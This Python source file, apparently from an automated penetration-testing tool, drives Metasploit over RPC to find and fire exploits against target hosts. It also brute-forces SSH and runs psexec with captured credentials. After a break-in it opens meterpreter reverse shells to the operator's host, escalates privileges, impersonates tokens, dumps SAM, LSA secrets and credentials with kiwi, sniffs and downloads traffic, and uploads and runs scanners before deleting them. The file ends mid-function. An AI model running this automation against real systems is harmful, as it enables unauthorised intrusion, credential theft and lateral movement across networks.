from pymetasploit3.msfrpc import MsfRpcClient
from database import mushilogger
import pprint
import time
import datetime
import re
import json
import copy
import random
import subprocess

class MetaSploit():
  def __init__(self):
    #print("init metasploit..")
    self.mlogger = mushilogger.MushiLogger()


  def msf_connection(self):
    client = MsfRpcClient('test', port=55553)
    time.sleep(10)
    return client


  def select_exploit_fm_localvuln(self, target, node_num, node):
    self.mlogger.writelog("Start select exploit from localvuln", "info")

    client = self.msf_connection()

    cid = client.consoles.console().cid
    #print('cid = {}'.format(cid))
    client.consoles.console(cid).read()

    exploit_candicate_list = []

    pattern = '(.*)( - )(.*)(: )(.*)'

    exploit = client.modules.use('post', 'multi/recon/local_exploit_suggester')
    exploit['SESSION'] = int(node[node_num]['session'])
    result = client.consoles.console(cid).run_module_with_output(exploit)

    rows = result.splitlines()
    for row in rows:
      if "[+]" in row:
        exploit_candicate = re.match(pattern, row)
        exploit_candicate = exploit_candicate.group(3).replace('\n', '')
        exploit_candicate_list.append(exploit_candicate)

    #print("exploit_candicate_list (rce) = {}".format(exploit_candicate_list))
    self.mlogger.writelog("exploit_candicate_list = " + pprint.pformat(exploit_candicate_list), "info")

    return exploit_candicate_list



  def select_exploit_fm_localvuln_ex(self, target, node_num, node):
    self.mlogger.writelog("Start select exploit from localvuln_ex", "info")

    client = self.msf_connection()

    cid = client.consoles.console().cid
    #print('cid = {}'.format(cid))
    client.consoles.console(cid).read()

    exploit_lce_candicate_list = []
    exploit_dos_candicate_list = []

    # from openport vuln list
    for vuln in node[node_num]["local_vuln_list"]:
      #print("vuln = {}".format(vuln))

      try:
        # exploit (RCE)
        search_command = "search type:exploit " + vuln + " platform:" + node[node_num]["os"]
        self.mlogger.writelog("search_command = " + search_command, "info")
        #print("search command = {}".format(search_command))
        
        client.consoles.console(cid).write(search_command)
        time.sleep(10)
        
        exploit_candicate = client.consoles.console(cid).read()

        if "No results from search" not in exploit_candicate['data']:
          exploit_candicate = exploit_candicate['data'].splitlines()
          #print("exploit_candicate = {}".format(exploit_candicate))

          # delete unnecessary strings
          del exploit_candicate[-4:-1]
          del exploit_candicate[0:6]

          for low in exploit_candicate:
            if "exploit" in low:
              low = low.split()
              exploit_lce_candicate_list.append(low[1])

        else:
          # exploit (DoS)
          search_command = "search auxiliary/dos " + vuln
          
          client.consoles.console(cid).write(search_command)
          time.sleep(10)
          
          exploit_candicate = client.consoles.console(cid).read()
          exploit_candicate = exploit_candicate['data'].splitlines()
          #print("exploit candicate (dos) = {}".format(exploit_candicate))

          # delete unnecessary strings
          del exploit_candicate[-4:-1]
          del exploit_candicate[0:6]

          for low in exploit_candicate:
            if "auxiliary/dos" in low:
              low = low.split()
              exploit_dos_candicate_list.append(low[1])

      except Exception as e:
        print("Error of select exploit fm vuln ex = {}".format(e))
        self.mlogger.writelog("Error of select exploit fm vuln ex = " + e, "error")

    #print("exploit_lce_candicate_list (rce) = {}".format(exploit_lce_candicate_list))
    self.mlogger.writelog("exploit_lce_candicate_list = " + pprint.pformat(exploit_lce_candicate_list), "info")

    #print("exploit_dos_candicate_list (dos) = {}".format(exploit_dos_candicate_list))
    self.mlogger.writelog("exploit_dos_candicate_list = " + pprint.pformat(exploit_dos_candicate_list), "info")

    return exploit_lce_candicate_list



  def select_exploit_fm_vuln(self, target, node_num, node):
    self.mlogger.writelog("Start select exploit from vuln", "info")

    client = self.msf_connection()

    cid = client.consoles.console().cid
    #print('cid = {}'.format(cid))
    client.consoles.console(cid).read()

    exploit_rce_candicate_list = []
    exploit_dos_candicate_list = []

    # from openport vuln list
    for vuln in node[node_num]["openport_vuln_list"]:
      #print("vuln = {}".format(vuln))

      try:
        # exploit (RCE)
        search_command = "search type:exploit " + vuln + " platform:" + node[node_num]["os"]
        self.mlogger.writelog("search_command = " + search_command, "info")
        #print("search command = {}".format(search_command))
        
        client.consoles.console(cid).write(search_command)
        time.sleep(10)
        
        exploit_candicate = client.consoles.console(cid).read()

        if "No results from search" not in exploit_candicate['data']:
          exploit_candicate = exploit_candicate['data'].splitlines()
          #print("exploit_candicate = {}".format(exploit_candicate))

          # delete unnecessary strings
          del exploit_candicate[-4:-1]
          del exploit_candicate[0:6]

          for low in exploit_candicate:
            if "exploit" in low:
              low = low.split()
              exploit_rce_candicate_list.append(low[1])

        else:
          # exploit (DoS)
          search_command = "search auxiliary/dos " + vuln
          
          client.consoles.console(cid).write(search_command)
          time.sleep(10)
          
          exploit_candicate = client.consoles.console(cid).read()
          exploit_candicate = exploit_candicate['data'].splitlines()
          #print("exploit candicate (dos) = {}".format(exploit_candicate))

          # delete unnecessary strings
          del exploit_candicate[-4:-1]
          del exploit_candicate[0:6]

          for low in exploit_candicate:
            if "auxiliary/dos" in low:
              low = low.split()
              exploit_dos_candicate_list.append(low[1])

      except Exception as e:
        print("Error of select exploit fm vuln = {}".format(e))
        self.mlogger.writelog("Error of select exploit fm vuln = " + e, "error")

    #print("exploit_rce_candicate_list (rce) = {}".format(exploit_rce_candicate_list))
    self.mlogger.writelog("exploit_rce_candicate_list = " + pprint.pformat(exploit_rce_candicate_list), "info")

    #print("exploit_dos_candicate_list (dos) = {}".format(exploit_dos_candicate_list))
    self.mlogger.writelog("exploit_dos_candicate_list = " + pprint.pformat(exploit_dos_candicate_list), "info")

    return exploit_rce_candicate_list


  def select_exploit_fm_service(self, target, node_num, node):
    self.mlogger.writelog("Start select exploit from service", "info")

    client = self.msf_connection()

    cid = client.consoles.console().cid
    #print('cid = {}'.format(cid))
    client.consoles.console(cid).read()

    exploit_candicate_list = []
    exploit_rce_list = []

    for port_num in range(0, len(node[node_num]["ports"])):
      port = node[node_num]["ports"][port_num]["number"].replace('/tcp', '')
      if port != "80" and port != "443": # Curretly, only http/https
        continue

      #print("port = {}".format(port))
      #platform = node[node_num]["os"]
      version = node[node_num]["ports"][port_num]["version"]
      version = version.split()

      for i in range(len(version)):
        search_version = ' '.join(version)
        search_command = "search type:exploit " + search_version
        self.mlogger.writelog("search_command = " + search_command, "info")
        #print("search_command = {}".format(search_command))
        version.pop()
    
        client.consoles.console(cid).write(search_command)
        time.sleep(10)
        
        exploit_candicate = client.consoles.console(cid).read()
        exploit_candicate = exploit_candicate['data'].splitlines()
        #print(exploit_candicate)
    
        # delete unnecessary strings
        del exploit_candicate[-4:-1]
        del exploit_candicate[0:6]
        
        for low in exploit_candicate:
          if "exploit" in low:
            low = low.split()
            exploit_candicate_list.append(low[1])
        
        #print("exploit candicate list = {}".format(exploit_candicate_list))

        os = node[node_num]["os_version"]
        if os == "unknown": # test code
          os = "Windows 10"
        
        for candicate in exploit_candicate_list:
          auto_target = -1
          match_target = -1
          payload_target = -1
          check_list = []
          try:
            exploit = client.modules.use('exploit', candicate)
            if str(exploit.runoptions["RPORT"]) == port:
              if not "SRVHOST" in exploit.runoptions:
                for key, value in exploit.targets.items():
                  check_list.append(value)
                  if os.lower() in value.lower():
                    match_target = key
                    if "qemu" in value.lower():
                      exploit.target = key
                  elif "Automatic" in value:
                    auto_target = key
                for payload in exploit.payloads:
                  if "windows/meterpreter/" in payload or "windows/x64/meterpreter/" in payload:
                    #print("payload = {}".format(payload))
                    payload_target = 1
                    break
        
              if (match_target != -1 and payload_target == 1):
                exploit_rce_list.append(candicate)
                #print("candicate = {}".format(candicate))
                #print("exploit target = {}".format(exploit.target))
                #print("auto_target = {}".format(auto_target))
              else:
                not_candicate = 0
                for row in check_list:
                  if "Windows" in row:
                    not_candicate = 1
                if not_candicate == 0:
                  exploit_rce_list.append(candicate)
                  #print("candicate = {}".format(candicate))
                  #print("exploit target = {}".format(exploit.target))
                  #print("auto_target = {}".format(auto_target))
        
          except KeyError as e:
          #except KeyError:
            print("Error of select exploit fm port = {}, {}".format(e, candicate))
            self.mlogger.writelog("Error of select exploit fm port = " + candicate, "error")
            continue
          #except Exception as e:
          #  print("Error of select exploit fm port = {}, {}".format(e, candicate))
          #  self.mlogger.writelog("Error of select exploit fm port = " + e + " " + candicate, "error")
          #  continue

    #print("exploit_rce_list = {}".format(exploit_rce_list))
    self.mlogger.writelog("exploit_rce_list = " + pprint.pformat(exploit_rce_list), "info")

    return exploit_rce_list


  def select_exploit_fm_port(self, target, node_num, node):
    self.mlogger.writelog("Start select exploit from open port", "info")

    client = self.msf_connection()

    cid = client.consoles.console().cid
    #print('cid = {}'.format(cid))
    client.consoles.console(cid).read()

    exploit_candicate_list = []
    exploit_rce_list = []
    
    for port_num in range(0, len(node[node_num]["ports"])):
      port = node[node_num]["ports"][port_num]["number"].replace('/tcp', '')
      platform = node[node_num]["os"]

      search_command = "search type:exploit port:" + port + " platform:" + platform + " -s date -r"
      self.mlogger.writelog("search_command = " + search_command, "info")
      #print("search_command = {}".format(search_command))
    
      client.consoles.console(cid).write(search_command)
      time.sleep(10)
      
      exploit_candicate = client.consoles.console(cid).read()
      exploit_candicate = exploit_candicate['data'].splitlines()
      #print(exploit_candicate)
    
      # delete unnecessary strings
      del exploit_candicate[-4:-1]
      del exploit_candicate[0:6]
      
      for low in exploit_candicate:
        if "exploit" in low:
          low = low.split()
          exploit_candicate_list.append(low[1])
      
      #print("exploit candicate list = {}".format(exploit_candicate_list))

      os = node[node_num]["os_version"]
      if os == "unknown": # test code
        os = "Windows 10"
      
      for candicate in exploit_candicate_list:
        auto_target = -1
        match_target = -1
        payload_target = -1
        check_list = []
        try:
          exploit = client.modules.use('exploit', candicate)
          if str(exploit.runoptions["RPORT"]) == port:
            if not "SRVHOST" in exploit.runoptions:
              for key, value in exploit.targets.items():
                check_list.append(value)
                if os.lower() in value.lower():
                  match_target = key
                  if "qemu" in value.lower():
                    exploit.target = key
                elif "Automatic" in value:
                  auto_target = key
              for payload in exploit.payloads:
                if "windows/meterpreter/" in payload or "windows/x64/meterpreter/" in payload:
                  #print("payload = {}".format(payload))
                  payload_target = 1
                  break
      
            if (match_target != -1 and payload_target == 1):
              exploit_rce_list.append(candicate)
              #print("candicate = {}".format(candicate))
              #print("exploit target = {}".format(exploit.target))
              #print("auto_target = {}".format(auto_target))
            else:
              not_candicate = 0
              for row in check_list:
                if "Windows" in row:
                  not_candicate = 1
              if not_candicate == 0:
                exploit_rce_list.append(candicate)
                #print("candicate = {}".format(candicate))
                #print("exploit target = {}".format(exploit.target))
                #print("auto_target = {}".format(auto_target))
      
        except KeyError as e:
        #except KeyError:
          print("Error of select exploit fm port = {}, {}".format(e, candicate))
          self.mlogger.writelog("Error of select exploit fm port = " + candicate, "error")
          continue
        #except Exception as e:
        #  print("Error of select exploit fm port = {}, {}".format(e, candicate))
        #  self.mlogger.writelog("Error of select exploit fm port = " + e + " " + candicate, "error")
        #  continue

    #print("exploit_rce_list = {}".format(exploit_rce_list))
    self.mlogger.writelog("exploit_rce_list = " + pprint.pformat(exploit_rce_list), "info")

    return exploit_rce_list



  def check_exploit(self, i, uuid, sessions_list, exploit_name):

    if sessions_list:
      print("sessions_list = {}".format(sessions_list))
      self.mlogger.writelog("sessions_list = " + pprint.pformat(sessions_list), "debug")

      for key in sessions_list.keys():
        #print("key = {}".format(key))

        if uuid == sessions_list[key]["exploit_uuid"]:
          print("match key = {}".format(key))
          print("exploit_uuid = {}".format(sessions_list[key]["exploit_uuid"]))
          print("exploit success...")
          self.mlogger.writelog("exploit success...", "info")
          return 0
        else:
          print("exploit/" + exploit_name + " failed...")
          return -1
    else:
      print("exploit/" + exploit_name + " failed...")
      self.mlogger.writelog("exploit/" + exploit_name + " failed...", "info")
      if i == 2: # exit after three times
        print("three times exploit/" + exploit_name + " failed...")
        self.mlogger.writelog("three times exploit/" + exploit_name + " failed...", "info")
        return -1


  def execute_exploit(self, ipaddr, node_num, node, mushikago_ipaddr, exploit_rce_list):
    client = self.msf_connection()

    uuid_list = []

    try:
      res = -1
      for rce in exploit_rce_list:
        print("execute {}".format(rce))
        self.mlogger.writelog("execute "+ rce, "info")

        #cid = client.consoles.console().cid
        #print('cid = {}'.format(cid))

        rce = rce.replace('exploit/', '')
        exploit = client.modules.use('exploit', rce)
        exploit['RHOSTS'] = ipaddr
        
        payloads = ['windows/x64/meterpreter/reverse_tcp', 'windows/x64/meterpreter/bind_tcp', 'windows/meterpreter/reverse_tcp', 'windows/meterpreter/bind_tcp']

        for p in payloads:
          if p in exploit.payloads:
            payload = client.modules.use('payload', p)
            print("payload = {}".format(p))
          else:
            #print("payload = {}".format(p))
            continue

          if 'reverse_tcp' in p:
            payload['LHOST'] = mushikago_ipaddr

          for i in range(2):
            port = random.randint(1023, 65535)
            payload['LPORT'] = str(port)
            
            print("target = {}".format(ipaddr))
            print("port = {}".format(port))
            print("payload = {}".format(p))
            self.mlogger.writelog("target =  " + ipaddr, "info")
            self.mlogger.writelog("port =  " + str(port), "info")
            self.mlogger.writelog("payload =  " + p, "info")
            #print("exploit option = {}".format(exploit.runoptions))
            #print("payload option = {}".format(payload.runoptions))
            
            for j in range(3):
              if len(uuid_list) > 0:
                 if client.sessions.list:
                   for v in client.sessions.list.values():
                     if v['exploit_uuid'] in uuid_list:
                       print("Delayed exploit success")
                       self.mlogger.writelog("Delayed exploit success", "info")
                       res = 0
                       break
                   else:
                     continue
                   break

              exploit_id = exploit.execute(payload=payload)
              job_id = exploit_id['job_id']
              uuid = exploit_id['uuid']
              uuid_list.append(uuid)

              print("exploit_id = {}".format(exploit_id))
              print("job_id = {}".format(job_id))
              print("uuid = {}".format(uuid))

              print("execute exploit...")
              self.mlogger.writelog("execute exploit...", "info")
              time.sleep(50)

              res = self.check_exploit(j, uuid, client.sessions.list, rce)

              if res == 0:
                break
            else:
              continue
            break
          else:
            continue
          break
        else:
          continue
        break

      if res == 0:
        session_num = []
        
        print("Sessions avaiables : ")
        for s in client.sessions.list.keys():
          session_num.append(str(s))
          print(session_num)
  
        node[node_num]['session'] = session_num[-1]
        node[node_num]['success_exploit'].append('exploit/' + rce)

        return 0
      else: 
        print("exploit {} failed...".format(rce))
        self.mlogger.writelog("exploit " + rce + " failed...", "info")
        return -1

    except KeyError as e:
      print(e)
      self.mlogger.writelog("KeyError of exploit " + rce + " failed...\n" + e, "error")
      return -1
        


  def execute_localexploit(self, ipaddr, node_num, node, mushikago_ipaddr, exploit_lce_list):
    client = self.msf_connection()

    uuid_list = []

    try:
      res = -1
      for lce in exploit_lce_list:
        print("execute {}".format(lce))
        self.mlogger.writelog("execute "+ lce, "info")

        #cid = client.consoles.console().cid
        #print('cid = {}'.format(cid))

        lce = lce.replace('exploit/', '')
        exploit = client.modules.use('exploit', lce)
        #exploit['RHOSTS'] = ipaddr
        exploit['SESSION'] = int(node[node_num]['session'])
        print("privilege escalation sessions = {}".format(int(node[node_num]['session'])))
        
        payloads = ['windows/meterpreter/reverse_tcp', 'windows/meterpreter/bind_tcp', 'windows/x64/meterpreter/reverse_tcp', 'windows/x64/meterpreter/bind_tcp']

        for p in payloads:
          if p in exploit.payloads:
            payload = client.modules.use('payload', p)
            print("payload = {}".format(p))
          else:
            #print("payload = {}".format(p))
            continue

          if 'reverse_tcp' in p:
            payload['LHOST'] = mushikago_ipaddr

          for i in range(2):
            port = random.randint(1023, 65535)
            payload['LPORT'] = str(port)
            
            print("target = {}".format(ipaddr))
            print("port = {}".format(port))
            print("payload = {}".format(p))
            self.mlogger.writelog("target =  " + ipaddr, "info")
            self.mlogger.writelog("port =  " + str(port), "info")
            self.mlogger.writelog("payload =  " + p, "info")
            #print("exploit option = {}".format(exploit.runoptions))
            #print("payload option = {}".format(payload.runoptions))
            
            res = -1
            for j in range(2):
              if len(uuid_list) > 0:
                 if client.sessions.list:
                   for v in client.sessions.list.values():
                     if v['exploit_uuid'] in uuid_list:
                       print("Delayed exploit success")
                       self.mlogger.writelog("Delayed exploit success", "info")
                       res = 0
                       break
              if res == 0:
                break

              exploit_id = exploit.execute(payload=payload)
              job_id = exploit_id['job_id']
              uuid = exploit_id['uuid']
              uuid_list.append(uuid)

              print("exploit_id = {}".format(exploit_id))
              print("job_id = {}".format(job_id))
              print("uuid = {}".format(uuid))

              print("execute localexploit " + lce)
              self.mlogger.writelog("execute localexploit...", "info")
              time.sleep(60)

              res = self.check_exploit(j, uuid, client.sessions.list, lce)

              if res == 0:
                break
              else:
                continue
            else:
              continue
            break
          else:
            continue
          break
        else:
          continue
        break

      if res == 0:
        session_num = []
        
        print("Sessions avaiables : ")
        for s in client.sessions.list.keys():
          session_num.append(str(s))
          print(session_num)
  
        node[node_num]['session'] = session_num[-1]
        node[node_num]['success_exploit'].append('exploit/' + lce)

        return 0
      else: 
        print("localexploit {} failed...".format(lce))
        self.mlogger.writelog("exploit " + lce + " failed...", "info")
        return -1

    except KeyError as e:
      print(e)
      self.mlogger.writelog("KeyError of exploit " + lce + " failed...\n" + e, "error")
      return -1


  def check_addomain(self, ipaddr, node_num, node):
    self.mlogger.writelog("check AD domain name", "info")

    client = self.msf_connection()

    cid = client.consoles.console().cid
    #print('cid = {}'.format(cid))
    client.consoles.console(cid).read()

    run = client.modules.use('auxiliary', 'scanner/smb/smb_version')
    run['RHOSTS'] = ipaddr

    pattern = '(.*)(domain:)(.*)'
    
    result = client.consoles.console(cid).run_module_with_output(run)
    rows = result.splitlines()
    
    for row in rows:
      if "domain:" in row:
        domain_info = re.match(pattern, row)
        domain = domain_info.group(3).replace(')', '').replace('\n', '')
        print(domain)
        self.mlogger.writelog("AD domain = "+ domain, "info")
        node[node_num]["ad_domain_name"] = domain


  def execute_psexec(self, ipaddr, node_num, node, mushikago_ipaddr, account, password, domain):
    client = self.msf_connection()

    print("execute psexec...")
    print("account = {}".format(account))
    print("password = {}".format(password))
    print("domain = {}".format(domain))
    self.mlogger.writelog("execute psexec...", "info")
    self.mlogger.writelog("account = " + account, "info")
    self.mlogger.writelog("password = " + password, "info")
    self.mlogger.writelog("domain = " + domain, "info")

    exploit = client.modules.use('exploit', 'windows/smb/psexec')
    exploit['RHOSTS'] = ipaddr
    exploit['SMBUser'] = account
    exploit['SMBPass'] = password
    exploit['SMBDomain'] = domain
    
    payloads = ['windows/x64/meterpreter/bind_tcp', 'windows/x64/meterpreter/reverse_tcp']

    for p in payloads:
      payload = client.modules.use('payload', p)
      if 'reverse_tcp' in p:
        payload['LHOST'] = mushikago_ipaddr

      for i in range(2):
        port = random.randint(1023, 65535)
        payload['LPORT'] = str(port)
        
        print("target = {}".format(ipaddr))
        print("port = {}".format(port))
        print("payload = {}".format(p))
        self.mlogger.writelog("target =  " + ipaddr, "info")
        self.mlogger.writelog("port =  " + str(port), "info")
        self.mlogger.writelog("payload =  " + p, "info")
        #print("exploit option = {}".format(exploit.runoptions))
        #print("payload option = {}".format(payload.runoptions))
        
        for j in range(2):
          exploit_id = exploit.execute(payload=payload)
          job_id = exploit_id['job_id']
          uuid = exploit_id['uuid']

          print("exploit_id = {}".format(exploit_id))
          print("job_id = {}".format(job_id))
          print("uuid = {}".format(uuid))

          print("execute exploit...")
          self.mlogger.writelog("execute exploit...", "info")
          time.sleep(60)

          res = self.check_exploit(i, uuid, client.sessions.list, "psexec")

          if res == 0:
            break
        else:
          continue
        break
      else:
        continue
      break

    if res == 0:
      session_num = []
      
      print("Sessions avaiables : ")
      for s in client.sessions.list.keys():
        session_num.append(str(s))
        print(session_num)
  
      node[node_num]['session'] = session_num[-1]
      node[node_num]['success_exploit'].append('exploit/windows/smb/psexec')
  
      return 0
    else:
      print("exploit psexec failed...")
      self.mlogger.writelog("exploit psexec failed...", "info")
      return -1


  def execute_ssh_bruteforce(self, ipaddr, node_num, node):
    client = self.msf_connection()

    print("execute ssh bruteforce...")
    self.mlogger.writelog("execute ssh bruteforce...", "info")

    cid = client.consoles.console().cid
    print('cid = {}'.format(cid))

    run = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
    run['RHOSTS'] = ipaddr
    run['USERPASS_FILE'] = "./root_userpass.txt"
    run['STOP_ON_SUCCESS'] = True
    print(run.runoptions)

    run_id = run.execute()
    job_id = run_id['job_id']
    uuid = run_id['uuid']
    print("run_id = {}".format(run_id))
    print("job_id = {}".format(job_id))
    print("uuid = {}".format(uuid))

    time.sleep(60)
    res = client.consoles.console(cid).read()
    #print("res = {}".format(res))

    print("session_list = {}".format(client.sessions.list))

    session_num = ""

    # get accout information
    #pattern = 'SSH (.*:)(.*()'
    pattern = 'SSH (.*)(:)(.*)(\(.*)'

    if client.sessions.list:
      for key in client.sessions.list.keys():
        if ipaddr == client.sessions.list[key]["target_host"] and "SSH" in client.sessions.list[key]["info"]:
          account_info = re.match(pattern, client.sessions.list[key]["info"])
          account = account_info.group(1).replace('\n', '').replace(' ', '')
          password = account_info.group(3).replace('\n', '').replace(' ', '')
          session_num = str(key)
          print("session = {}".format(key))
          print("account = {}".format(account))
          print("password = {}".format(password))
          self.mlogger.writelog("session = " + key, "info")
          self.mlogger.writelog("account = " + account, "info")
          self.mlogger.writelog("password = " + password, "info")
          break

    if session_num == "":
      return -1

    node[node_num]["local_account_pass"].append(account)
    node[node_num]["local_account_pass"].append(password)

    # shell to meterpreter
    if session_num != "":
      print("execute sshexec...")
      self.mlogger.writelog("execute sshexec...", "info")

      exploit = client.modules.use('exploit', 'multi/ssh/sshexec')
      exploit['RHOSTS'] = ipaddr
      exploit['USERNAME'] = account
      exploit['PASSWORD'] = password

      #payload = client.modules.use('payload', 'linux/x86/meterpreter/bind_nonx_tcp')
      uuid_list = []

      payload = client.modules.use('payload', 'linux/x86/meterpreter/bind_tcp')
      for i in range(3):
        port = random.randint(1023, 65535)
        payload['LPORT'] = str(port)
        
        print("target = {}".format(ipaddr))
        print("port = {}".format(port))
        print("payload = {}".format(payload))
        self.mlogger.writelog("target =  " + ipaddr, "info")
        self.mlogger.writelog("port =  " + str(port), "info")
        self.mlogger.writelog("payload = linux/x86/meterpreter/bind_tcp", "info")
        
        for j in range(3):
          if len(uuid_list) > 0:
             if client.sessions.list:
               for v in client.sessions.list.values():
                 if v['exploit_uuid'] in uuid_list:
                   print("Delayed exploit success")
                   self.mlogger.writelog("Delayed exploit success", "info")
                   res = 0
                   break
               else:
                 continue
               break

          exploit_id = exploit.execute(payload=payload)
          job_id = exploit_id['job_id']
          uuid = exploit_id['uuid']
          uuid_list.append(uuid)

          print("exploit_id = {}".format(exploit_id))
          print("job_id = {}".format(job_id))
          print("uuid = {}".format(uuid))

          print("execute exploit...")
          self.mlogger.writelog("execute exploit...", "info")
          time.sleep(60)

          res = self.check_exploit(j, uuid, client.sessions.list, "ssh/exec")

          if res == 0:
            break
        else:
          continue
        break

    if res == 0:
      session_num = []
      
      print("Sessions avaiables : ")
      for s in client.sessions.list.keys():
        session_num.append(str(s))
        print(session_num)
  
      node[node_num]['session'] = session_num[-1]
      return 0

    else:
      print("exploit ssh bruteforce failed...")
      self.mlogger.writelog("exploit ssh bruteforce failed...", "info")
      return -1

    #if session_num != "":
    #  client.consoles.console(cid).write('sessions -u ' + session_num)
    #  time.sleep(40)
    #  res = print(client.consoles.console(cid).read())
    #  if client.sessions.list:
    #    for key in client.sessions.list.keys():
    #      if ipaddr in client.sessions.list[key]["session_host"] and "meterpreter" in client.sessions.list[key]["type"]:
    #        print("session = {}".format(key))
    #        session_num = str(key)

    #  print("meterpreter session_num = {}".format(session_num))

    #  node[node_num]['session'] = session_num
    #  return 0
    #else:
    #  print("ssh bruteforce failed...")
    #  return -1



  def execute_incognito(self):
    client = self.msf_connection()

    print("execute incognito..")
    self.mlogger.writelog("execute incognito...", "info")

    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    client.sessions.session(session_num[0]).write('load incognito')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())
    #self.mlogger.writelog("execute incognito...", "info")

    client.sessions.session(session_num[0]).write('list_tokens -u')
    time.sleep(20)
    print(client.sessions.session(session_num[0]).read())

    client.sessions.session(session_num[0]).write('impersonate_token mushikago-PC\\\\mushikago')
    #client.sessions.session(session_num).write('impersonate_token ONIGIRI\\\\Administrator')
    time.sleep(20)
    print(client.sessions.session(session_num[0]).read())

    client.sessions.session(session_num[0]).write('rev2self')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())


  def execute_sniff_win(self, node_num, node):
    client = self.msf_connection()

    print("execute network sniffing..")
    self.mlogger.writelog("execute network sniffing...", "info")

    session_num = node[node_num]['session']

    client.sessions.session(session_num).write('load sniffer')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
    
    client.sessions.session(session_num).write('sniffer_interfaces')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    self.mlogger.writelog(result, "info")

    interface_list = []
    interface_list.clear()
    pattern = '(.*)( - ).*'

    rows = result.splitlines()
    
    for row in rows:
      if "type:" in row.lower():
        result = re.match(pattern, row)
        interface_list.append(result.group(1).replace('\n', ''))
    
    #print("interface_list = {}".format(interface_list))

    for interface in interface_list:
      client.sessions.session(session_num).write('sniffer_start ' + interface)
      time.sleep(10)
      result = client.sessions.session(session_num).read()

      if "Capture started" in result:
        print(result)

        filename = "if" + interface + "_" + node[node_num]["id"] + "_" + str(datetime.date.today()) + ".pcap"

        time.sleep(50)

        client.sessions.session(session_num).write('sniffer_dump ' + interface + ' ./' + filename)
        time.sleep(30)
        #print(client.sessions.session(session_num).read())
        self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('sniffer_stop ' + interface)
        time.sleep(10)
        #print(client.sessions.session(session_num).read())
        self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('sniffer_release ' + interface)
        time.sleep(10)
        #print(client.sessions.session(session_num).read())
        self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

        node[node_num]["pcap_list"].append(filename)

      else:
        print("Failed capture network interface {}...".format(interface))
        self.mlogger.writelog("Failed capture network interface " + interface, "error")


  def execute_sniff_linux(self, node_num, node):
    client = self.msf_connection()

    print("execute network sniffing for Linux..")
    self.mlogger.writelog("execute network sniffing for Linux...", "info")

    session_num = node[node_num]['session']

    client.sessions.session(session_num).write('ipconfig')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    nic_info = []
    pattern = '.*( : )(.*)'
    
    rows = result.splitlines()

    for row in rows:
      if "name" in row.lower():
        result = re.match(pattern, row)
        if (result.group(2) != "lo"):
          nic_info.append(result.group(2).replace('\n', ''))
    
    print("nic info (Linux) = {}".format(nic_info))
    self.mlogger.writelog("nic info (Linux) = " + pprint.pformat(nic_info), "info")
    #node[node_num]['ipconfig_info'] = copy.deepcopy(ipaddr_info)

    for nic in nic_info:
      with open('./bat/tcpdump.sh', 'w') as f:
        filename = nic + "_" + node[node_num]["id"] + "_" + str(datetime.date.today()) + ".pcap"
        print("tcpdump -i " + nic + " -w " + filename + " -W1 -G10")

        # 10-second capture
        client.sessions.session(session_num).write('execute -f tcpdump -a \"-i ' + nic + ' -w ' + filename + ' -W1 -G10\"')
        time.sleep(20)
        #print(client.sessions.session(session_num).read())
        self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('download ' + filename)
        time.sleep(20)
        #print(client.sessions.session(session_num).read())
        self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

        node[node_num]["pcap_list"].append(filename)

    nic_info.clear()



  def execute_kiwi(self):
    client = self.msf_connection()

    print("execute kiwi..")
    self.mlogger.writelog("execute kiwi...", "info")

    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    client.sessions.session(session_num).write('load kiwi')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
    
    client.sessions.session(session_num).write('lsa_dump_sam')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('lsa_dump_secrets')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
    
    client.sessions.session(session_num).write('creds_all')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")



  def execute_arpscan(self, nwaddr, cidr, node, node_num):
    client = self.msf_connection()

    print("execute arpscan {}{}...".format(nwaddr, cidr))
    self.mlogger.writelog("execute arpscan " + str(nwaddr) + cidr, "info")

    with open('./bat/arp-scan.bat', 'w') as f:
      f.write(".\\arp-scan.exe -t " + nwaddr + cidr + " > arp-scan.log")

    session_num = node[node_num]['session']

    client.sessions.session(session_num).write('upload ./bin/arp-scan.exe')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('upload ./bat/arp-scan.bat')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('execute -f arp-scan.bat')
    time.sleep(1200) # 20 minutes
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('download arp-scan.log')
    time.sleep(30)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('rm arp-scan.exe arp-scan.bat arp-scan.log')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")


  def setting_route(self, network_addr, netmask, session_num):
    client = self.msf_connection()

    print("setting routing...")
    self.mlogger.writelog("setting routing...", "info")

    cid = client.consoles.console().cid
    #print('cid = {}'.format(cid))

